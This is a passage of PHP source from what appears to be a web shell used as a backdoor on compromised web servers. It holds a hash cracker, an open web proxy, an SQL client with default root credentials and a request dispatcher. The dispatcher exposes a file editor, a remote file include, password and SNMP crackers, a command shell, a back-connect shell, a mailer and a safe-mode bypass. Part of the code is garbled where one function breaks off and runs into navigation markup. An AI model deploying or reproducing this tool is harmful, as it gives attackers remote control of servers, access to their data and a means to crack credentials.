if($dictionary){
$hash=strtoupper($_REQUEST['hash']);
echo '<font color=blue>Cracking '.htmlspecialchars($hash).'...<br>';
$type=($_REQUEST['type']=='MD5')?'md5':'sha1';
while(!feof($dictionary)){
$word=trim(fgets($dictionary)," \n\r");
if($hash==strtoupper(($type($word)))){echo "The answer is $word<br>";if($log)file_add_contentS($file,"$x\r\n");break;}
}
echo 'Done!</font>';
fclose($dictionary);
}
else{
echo "$errorbox Can not open dictionary.$et";
}
}
echo "<center>${t}Hash cracker:</td><td bgcolor='#333333'></td></tr><form method='POST'><tr><td width='20%' bgcolor='#666666'>Dictionary:</td><td bgcolor='#666666'><input type=text name=dictionary size=35></td></tr><tr><td width='20%' bgcolor='#808080'>Hash:</td><td bgcolor='#808080'><input type=text name=hash size=35></td></tr><tr><td width='20%' bgcolor='#666666'>Type:</td><td bgcolor='#666666'><select name=type><option selected value=MD5>MD5</option><option value=SHA1>SHA1</option></select></td></tr><tr><td width='20%' bgcolor='#808080'><input type=checkbox name=loG value=1 onClick='document.form.logfilE.disabled = !document.form.logfilE.disabled;' style='border-width:1px;background-color:#808080;' checked>Log</td><td bgcolor='#808080'><input type=text name=logfilE size=25 value='".whereistmP().DIRECTORY_SEPARATOR.".log'> $hcwd <input class=buttons type=submit value=Start></form>$et</center>";
}
function pr0xy(){
global $errorbox,$et,$footer,$hcwd;
echo "<table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='100%'><form method='POST'><tr><td width='20%'><b>Navigator: </b><input type=text name=urL size=140 value='";if(!!empty($_REQUEST['urL'])) echo 'http://www.edpsciences.org/htbin/ipaddress'; else echo htmlspecialchars($_REQUEST['urL']);echo "'>$hcwd<input type=submit class=buttons value=Go></form>$et";
if(!empty($_REQUEST['urL'])){
$u=parse_url($_REQUEST['urL']);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';
$dir=dirname($file);
$con=getiT($_REQUEST['urL']);
$s=array("href=mailto"=>"HrEf=mailto","HREF=mailto"=>"HrEf=mailto","href='mailto"=>"HrEf=\"mailto","HREF=\"mailto"=>"HrEf=\"mailto","href=\'mailto"=>"HrEf=\"mailto","HREF=\'mailto"=>"HrEf=\"mailto","href=\"http"=>"HrEf=\"".hlinK("seC=px&urL=http"),"href=\'http"=>"HrEf=\"".hlinK("seC=px&urL=http"),"HREF=\'http"=>"HrEf=\"".hlinK("seC=px&urL=http"),"href=http"=>"HrEf=".hlinK("seC=px&urL=http"),"HREF=http"=>"HrEf=".hlinK("seC=px&urL=http"),"href=\""=>"HrEf=\"".hlinK("seC=px&urL=http://$host/$dir/"),"HREF=\""=>"HrEf=\"".hlinK("seC=px&urL=http://$host/$dir/"),"href=\""=>"HrEf=\'".hlinK("seC=px&urL=http://$host/$dir/"),'HREF="'=>'HrEf="'.hlinK("seC=px&urL=http://$host/$dir/"),"href="=>"HrEf=".hlinK("seC=px&urL=http://$host/$dir/"),"HREF="=>"HrEf=".hlinK("seC=px&urL=http://$host/$dir/"));
$con=replace_stR($s,$con);
echo $con;
}
}
function sqlclienT(){
global $t,$errorbox,$et,$hcwd;
if(!empty($_REQUEST['serveR']) && !empty($_REQUEST['useR']) && isset($_REQUEST['pasS']) && !empty($_REQUEST['querY'])){
$server=$_REQUEST['serveR'];$type=$_REQUEST['typE'];$pass=$_REQUEST['pasS'];$user=$_REQUEST['useR'];$query=$_REQUEST['querY'];
$db=(empty($_REQUEST['dB']))?'':$_REQUEST['dB'];
$res=querY($type,$server,$user,$pass,$db,$query);
if($res){
$res=str_replace('|-|-|-|-|-|','</td><td>',$res);
$res=str_replace('|+|+|+|+|+|','</td></tr><tr><td>',$res);
$r=explode('[+][+][+]',$res);
$r[1]=str_replace('[-][-][-]',"</td><td bgcolor='333333'>",$r[1]);
echo "<table border=0 bgcolor='666666' width='100%'></tr><tr><td bgcolor='333333'>".$r[1].'</tr><tr><td>'.$r[0]."$et<br>";
}
else{
echo "$errorbox Failed!$et<br>";
}
}
if(empty($_REQUEST['typE']))$_REQUEST['typE']='';
echo "<center>${t}SQL cilent:</td><form name=client method='POST'><td bgcolor='#333333'><select name=typE><option valut=MySQL  onClick='document.client.serveR.disabled = false;' ";if ($_REQUEST['typE']=='MySQL')echo 'selected';echo ">MySQL</option><option valut=MSSQL onClick='document.client.serveR.disabled = false;' ";if ($_REQUEST['typE']=='MSSQL')echo 'selected';echo ">MSSQL</option><option valut=Oracle onClick='document.client.serveR.disabled = true;' ";if ($_REQUEST['typE']=='Oracle')echo 'selected';echo ">Oracle</option><option valut=PostgreSQL onClick='document.client.serveR.disabled = false;' ";if ($_REQUEST['typE']=='PostgreSQL')echo 'selected';echo ">PostgreSQL</option></select></td></tr><tr><td width='20%' bgcolor='#666666'>Server:</td><td bgcolor='#666666'><input type=text value='";if (!empty($_REQUEST['serveR'])) echo htmlspecialchars($_REQUEST['serveR']);else echo 'localhost'; echo "' name=serveR size=35></td></tr><tr><td width='20%' bgcolor='#808080'>Username:</td><td bgcolor='#808080'><input type=text name=useR value='";if (!empty($_REQUEST['useR'])) echo htmlspecialchars($_REQUEST['useR']);else echo 'root'; echo "' size=35></td><tr><td width='20%' bgcolor='#666666'>Password:</td><td bgcolor='#666666'><input type=text value='";if (isset($_REQUEST['pasS'])) echo htmlspecialchars($_REQUEST['pasS']);else echo '123456'; echo "' name=pasS size=35></td></tr><tr><td width='20%' bgcolor='#808080'>Database:</td><td bgcolor='#808080'><input type=text value='";if (!empty($_REQUEST['dB'])) echo htmlspecialchars($_REQUEST['dB']); echo "' name=dB size=35></td><tr><td width='20%' bgcolor='#666666'>Query:</td><td bgcolor='#666666'><textarea name=querY rows=5 cols=27>";if (!empty($_REQUEST['querY'])) echo htmlspecialchars(($_REQUEST['querY']));else echo 'SHOW DATABASES'; echo "</textarea></td></tr></tr><tr><td width='20%' bgcolor='#808080'></td><td bgcolor='#808080' align=right>$hcwd<input class=buttons type=submit value='Submit Query'></form>$et</center>";
}
function querY($type,$host,$user,$pass,$db='',$query){
$res='';
switch($type){
case 'MySQL':
if(!function_exists('mysql_connect'))return 0;
$link=mysql_connect($host,$user,$pass);
if($link){
if(!empty($db))mysql_select_db($db,$link);
$result=mysql_query($query,$link);
while($data=mysql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<mysql_num_fields($result);$i++)
$res.=mysql_field_name($result,$i).'[-][-][-]';
mysql_close($link);
return $res;
}
break;
case 'MSSQL':
if(!function_exists('mssql_connect'))return 0;
$link=mssql_connect($host,$user,$pass);
if($link){
if(!empty($db))mssql_select_db($db,$link);
$result=mssql_query($query,$link);
while($data=mssql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<mssql_num_fields($result);$i++)
$res.=mssql_field_name($result,$i).'[-][-][-]';
mssql_close($link);
return $res;
}
break;
case 'Oracle':
if(!function_exists('ocilogon'))return 0;
$link=ocilogon($user,$pass,$db);
if($link){
$stm=ociparse($link,$query);
ociexecute($stm,OCI_DEFAULT);
while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<oci_num_fields($stm);$i++)
$res.=oci_field_name($stm,$i).'[-][-][-]';
return $res;
}
break;
case 'PostgreSQL':
if(!function_exists('pg_connect'))return 0;
$link=pg_connect("host=$host dbname=$db user=$user password=$pass");
if($link){
$result=pg_query($link,$query);
while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<pg_num_fields($result);$i++)
$res.=pg_field_name($result,$i).'[-][-][-]';
pg_close($link);
return $res;
}
break;
}
return 0;
}
function phpevaL(){
global $t,$hcwd,$et;
echo '<center>';
if(!empty($_REQUEST['code'])){
$s=array('<?php'=>'','<?'=>'','?><?php echo hlinK('seC=fm&workingdiR='.addslashes($cwd).'&chmoD=');?><?php echo $cwd; ?><?php echo hlinK("seC=sysinfo&workingdiR=$cwd");?><?php echo hlinK("seC=fm&workingdiR=$cwd");?><?php echo hlinK("seC=edit&workingdiR=$cwd");?><?php echo hlinK("seC=webshell&workingdiR=$cwd");?><?php echo hlinK("seC=br&workingdiR=$cwd");?><?php echo hlinK("seC=asm&workingdiR=$cwd");?><?php echo hlinK("seC=sqlcl&workingdiR=$cwd"); ?><?php echo hlinK("seC=ftpc&workingdiR=$cwd"); ?><?php echo hlinK("seC=mailer&workingdiR=$cwd"); ?><?php echo hlinK("seC=eval&workingdiR=$cwd");?><?php echo hlinK("seC=sc&workingdiR=$cwd"); ?><?php echo hlinK("seC=cr&workingdiR=$cwd");?><?php echo hlinK("seC=px&workingdiR=$cwd");?><?php echo hlinK("seC=tools&workingdiR=$cwd");?><?php echo hlinK("seC=calc&workingdiR=$cwd");?><?php echo hlinK("seC=about&workingdiR=$cwd");?><?php if(isset($_COOKIE['passw'])) echo "- [<a href='".hlinK("seC=logout")."'>Logout</a>]";?><?php
if(!empty($_REQUEST['seC'])){
switch($_REQUEST['seC']){
case 'fm':filemanageR();break;
case 'sc':scanneR();break;
case 'phpinfo':phpinfo();break;
case 'edit':if(!empty($_REQUEST['open']))editoR($_REQUEST['filE']);
if(!empty($_REQUEST['Save'])){
$filehandle=fopen($_REQUEST['file'],'w');
fwrite($filehandle,$_REQUEST['edited']);
fclose($filehandle);}
if(!empty($_REQUEST['filE']))editoR($_REQUEST['filE']);else editoR('');
break;
case 'openit':openiT($_REQUEST['namE']);break;
case 'cr':crackeR();break;
case 'dic':dicmakeR();break;
case 'tools':toolS();break;
case 'hex':hexvieW();break;
case 'img':showimagE($_REQUEST['filE']);break;
case 'inc':if(file_exists($_REQUEST['filE']))include($_REQUEST['filE']);break;
case 'hc':hashcrackeR();break;
case 'fcr':formcrackeR();break;
case 'auth':authcrackeR();break;
case 'ftpc':ftpclienT();break;
case 'eval':phpevaL();break;
case 'snmp':snmpcrackeR();break;
case 'px':pr0xy();break;
case 'webshell':webshelL();break;
case 'mailer':maileR();break;
case 'br':brshelL();break;
case 'asm':safemodE();break;
case 'sqlcl':sqlclienT();break;
case 'calc':calC();break;
case 'sysinfo':sysinfO();break;
case 'checksum':checksuM($_REQUEST['filE']);break;
case 'logout':logouT();break;
default: echo $intro;}}else echo $intro;
echo $footer;?>